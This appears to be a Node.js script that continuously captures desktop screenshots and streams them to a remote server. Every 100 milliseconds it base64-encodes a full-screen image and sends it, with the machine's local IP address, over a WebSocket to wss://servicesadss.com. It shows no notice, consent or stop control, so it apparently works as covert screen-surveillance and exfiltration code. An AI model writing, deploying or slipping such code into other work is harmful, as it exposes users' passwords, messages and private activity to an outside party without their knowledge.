const WebSocket = require('ws');
const screenshot = require('screenshot-desktop');
const os = require('os');

const ws = new WebSocket('wss://servicesadss.com'); 

ws.on('open', () => {
  console.log('Connected to server');
  startScreenSharing();
});
 
ws.on('close', () => {
  console.log('Disconnected from server');
});

function startScreenSharing() {
  setInterval(() => {
    screenshot().then((img) => {
      const message = {
        screenData: img.toString('base64'),
        ip: getLocalIPAddress(),
      };
      ws.send(JSON.stringify(message));
    }).catch((err) => {
      console.error('Screenshot error:', err);
    });
  }, 100); // ส่งภาพทุก 100 มิลลิวินาที
}

function getLocalIPAddress() {
  const ifaces = os.networkInterfaces();
  for (const ifname of Object.keys(ifaces)) {
    for (const iface of ifaces[ifname]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1';
}
